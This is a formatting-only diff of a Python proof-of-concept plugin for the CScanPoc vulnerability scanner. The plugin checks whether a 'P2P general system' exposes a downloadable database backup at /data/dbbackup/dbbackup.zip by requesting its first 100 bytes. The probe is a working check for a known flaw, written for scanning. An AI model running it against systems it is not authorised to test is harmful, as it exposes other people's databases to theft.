@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'P2P_0002' # 平台漏洞编号，留空
+    vuln_id = 'P2P_0002'  # 平台漏洞编号，留空
     name = 'P2P通用系统 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-08-20'  # 漏洞公布时间
     desc = '''
         P2P通用系统逻辑错误，导致数据库可直接下载。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'P2P通用系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '5adff45d-8621-4e18-9206-b86c9b08bea2'
@@ -30,15 +32,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             payload = '/data/dbbackup/dbbackup.zip'
             target = self.target + payload
             header = 'Range:  bytes=0-100'
-            code, head, res, errcode, _ = hh.http(target,header=header)
+            code, head, res, errcode, _ = hh.http(target, header=header)
 
             if code == 206 and 'dbbackup' in res:
-                #security_note(target)
+                # security_note(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
